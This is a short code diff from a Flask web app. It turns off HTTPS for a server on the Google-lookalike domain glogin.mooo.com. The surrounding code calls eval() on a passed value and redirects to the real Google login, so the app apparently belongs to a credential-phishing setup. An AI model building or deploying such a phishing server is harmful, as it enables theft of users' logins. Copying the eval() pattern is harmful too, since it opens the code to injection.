@@ -44,4 +44,5 @@ def logger1(data, func):
     if eval(func) == 2:
       return redirect("https://accounts.google.com")
 
-app.run(ssl_context=('/etc/letsencrypt/live/glogin.mooo.com/cert.pem', '/etc/letsencrypt/live/glogin.mooo.com/privkey.pem'), host='0.0.0.0', port=7632)
+app.run(host='0.0.0.0', port=7632)
+#app.run(ssl_context=('/etc/letsencrypt/live/glogin.mooo.com/cert.pem', '/etc/letsencrypt/live/glogin.mooo.com/privkey.pem'), host='0.0.0.0', port=7632)
